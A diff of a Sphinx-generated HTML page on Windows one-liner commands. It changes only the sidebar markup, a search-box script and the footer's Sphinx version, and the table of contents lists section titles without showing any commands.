 <li><a class="reference internal" href="#">One-liners commands</a><ul>
 <li><a class="reference internal" href="#basic-powershell-commands">Basic PowerShell commands</a></li>
 <li><a class="reference internal" href="#download-and-run">Download and run</a></li>
@@ -964,12 +956,17 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
 </li>
 </ul>
 
-  <h4>Previous topic</h4>
-  <p class="topless"><a href="key_shortcuts.html"
-                        title="previous chapter">Keyboard shortcuts on Windows</a></p>
-  <h4>Next topic</h4>
-  <p class="topless"><a href="utc-clock.html"
-                        title="next chapter">Set hardware clock to UTC</a></p>
+  </div>
+  <div>
+    <h4>Previous topic</h4>
+    <p class="topless"><a href="key_shortcuts.html"
+                          title="previous chapter">Keyboard shortcuts on Windows</a></p>
+  </div>
+  <div>
+    <h4>Next topic</h4>
+    <p class="topless"><a href="utc-clock.html"
+                          title="next chapter">Set hardware clock to UTC</a></p>
+  </div>
   <h3>This Page</h3>
   <ul class="this-page-menu">
     <li><a href="../_sources/windows/oneliners-commands.rst.txt"
@@ -988,7 +985,7 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
     </form>
     </div>
 </div>
-<script>$('#searchbox').show(0);</script>
+<script>document.getElementById('searchbox').style.display = "block"</script>
         </div>
       </div>
       <div class="clearer"></div>
@@ -1011,8 +1008,8 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
       </ul>
     </div>
     <div class="footer" role="contentinfo">
-        &#169; Copyright 2013-2023, Nicolas Iooss.
-      Created using <a href="https://www.sphinx-doc.org/">Sphinx</a> 4.3.2.
+    &#169; Copyright 2013-2023, Nicolas Iooss.
+      Created using <a href="https://www.sphinx-doc.org/">Sphinx</a> 7.2.6.
     </div>
   </body>
 </html>
